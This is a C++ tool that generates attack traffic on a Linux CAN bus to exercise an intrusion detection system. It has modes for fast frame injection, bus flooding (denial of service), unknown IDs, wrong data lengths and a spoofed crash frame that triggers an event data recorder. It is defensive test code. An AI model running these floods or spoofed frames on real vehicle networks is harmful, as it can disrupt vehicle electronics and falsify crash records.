// Standalone CAN attack generator. Writes crafted frames onto a can/vcan
// interface to exercise the IDS live. Contains its own socket write code;
// it does not touch SocketCanSource (which owns the read path).

#include <linux/can.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <chrono>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <string>
#include <thread>

namespace {

// Open a raw CAN socket bound to ifname for sending. Returns -1 on error.
int open_can(const std::string& ifname) {
    int fd = ::socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (fd < 0) {
        return -1;
    }

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
    if (::ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        ::close(fd);
        return -1;
    }

    struct sockaddr_can addr;
    std::memset(&addr, 0, sizeof(addr));
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;
    if (::bind(fd, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) < 0) {
        ::close(fd);
        return -1;
    }
    return fd;
}

// Send one CAN frame.
void send_frame(int fd, uint32_t id, const uint8_t* data, uint8_t dlc) {
    struct can_frame frame;
    std::memset(&frame, 0, sizeof(frame));
    frame.can_id = id;
    frame.can_dlc = (dlc > 8) ? 8 : dlc;
    if (data != nullptr && frame.can_dlc > 0) {
        std::memcpy(frame.data, data, frame.can_dlc);
    }
    if (::write(fd, &frame, sizeof(frame)) != static_cast<ssize_t>(sizeof(frame))) {
        std::cerr << "warning: frame write failed\n";
    }
}

void usage(const char* prog) {
    std::cerr << "usage: " << prog << " <ifname> <mode> [count]\n"
              << "  modes: inject | flood | unknown | baddlc | crash\n";
}

constexpr uint32_t KNOWN_ID = 0x180;
constexpr uint32_t UNKNOWN_ID = 0x999;
constexpr uint32_t CRASH_ID = 0x000;

}  // namespace

int main(int argc, char** argv) {
    if (argc < 3) {
        usage(argv[0]);
        return 1;
    }

    const std::string ifname = argv[1];
    const std::string mode = argv[2];
    const long count = (argc > 3) ? std::strtol(argv[3], nullptr, 10) : 0;

    const int fd = open_can(ifname);
    if (fd < 0) {
        std::cerr << "error: cannot open CAN interface '" << ifname << "'\n";
        return 1;
    }

    const uint8_t payload8[8] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x11, 0x22, 0x33};

    if (mode == "inject") {
        // Correct DLC, far too fast -> only PeriodViolation should fire.
        const long n = (count > 0) ? count : 20;
        std::cerr << "injecting 0x180 x" << n << " at 2ms spacing...\n";
        for (long i = 0; i < n; ++i) {
            send_frame(fd, KNOWN_ID, payload8, 8);
            std::this_thread::sleep_for(std::chrono::milliseconds(2));
        }
    } else if (mode == "flood") {
        // As fast as possible: bus saturation / DoS.
        const long n = (count > 0) ? count : 1000;
        std::cerr << "flooding bus x" << n << " (no delay)...\n";
        for (long i = 0; i < n; ++i) {
            send_frame(fd, KNOWN_ID, payload8, 8);
        }
    } else if (mode == "unknown") {
        // ID not present in any IDS profile -> UnknownId.
        const long n = (count > 0) ? count : 20;
        std::cerr << "sending unknown id 0x999 x" << n << "...\n";
        for (long i = 0; i < n; ++i) {
            send_frame(fd, UNKNOWN_ID, payload8, 8);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    } else if (mode == "baddlc") {
        // Known ID, wrong length -> InvalidDlc.
        const long n = (count > 0) ? count : 20;
        std::cerr << "sending 0x180 with bad dlc=3 x" << n << "...\n";
        for (long i = 0; i < n; ++i) {
            send_frame(fd, KNOWN_ID, payload8, 3);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    } else if (mode == "crash") {
        // Crash trigger ID, once -> EDR writes a record immediately.
        std::cerr << "sending crash frame 0x000 once...\n";
        send_frame(fd, CRASH_ID, payload8, 8);
    } else {
        usage(argv[0]);
        ::close(fd);
        return 1;
    }

    ::close(fd);
    return 0;
}
